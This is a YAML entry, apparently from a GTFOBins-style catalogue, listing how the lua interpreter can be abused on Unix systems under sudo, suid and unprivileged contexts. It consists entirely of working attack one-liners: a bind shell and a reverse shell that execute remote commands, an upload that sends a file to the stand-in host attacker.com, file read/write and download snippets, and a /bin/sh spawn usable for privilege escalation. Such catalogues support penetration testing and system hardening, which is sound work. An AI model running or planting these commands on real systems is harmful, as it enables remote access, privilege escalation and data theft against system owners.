---
functions:
  bind-shell:
  - code: |-
      lua -e '
        local k=require("socket");
        local s=assert(k.bind("*",12345));
        local c=s:accept();
        while true do
          local r,x=c:receive();local f=assert(io.popen(r,"r"));
          local b=assert(f:read("*a"));c:send(b);
        end;c:close();f:close();'
    comment: |-
      This requires `lua-socket` to be available.
    connector: tcp-client
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
  download:
  - code: |-
      lua -e '
        local k=require("socket");
        local s=assert(k.bind("*",12345));
        local c=s:accept();
        local d,x=c:receive("*a");
        c:close();
        local f=io.open("/path/to/output-file", "wb");
        f:write(d);
        io.close(f);'
    comment: |-
      This requires `lua-socket` to be available.
    contexts:
      sudo:
      suid:
      unprivileged:
    sender: tcp-client
  file-read:
  - code: |-
      lua -e 'local f=io.open("/path/to/input-file", "rb"); io.write(f:read("*a")); io.close(f);'
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - code: |-
      lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
    contexts:
      sudo:
      suid:
      unprivileged:
  reverse-shell:
  - code: |-
      lua -e '
        local s=require("socket");
        local t=assert(s.tcp());
        t:connect("attacker.com",12345);
        while true do
          local r,x=t:receive();local f=assert(io.popen(r,"r"));
          local b=assert(f:read("*a"));t:send(b);
        end;
        f:close();t:close();'
    comment: |-
      This requires `lua-socket` to be available.
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
    listener: tcp-server
  shell:
  - code: |-
      lua -e 'os.execute("/bin/sh")'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
  upload:
  - code: |-
      lua -e '
        local f=io.open("/path/to/input-file", "rb")
        local d=f:read("*a")
        io.close(f);
        local s=require("socket");
        local t=assert(s.tcp());
        t:connect("attacker.com",12345);
        t:send(d);
        t:close();'
    comment: |-
      This requires `lua-socket` to be available.
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver: tcp-server
...
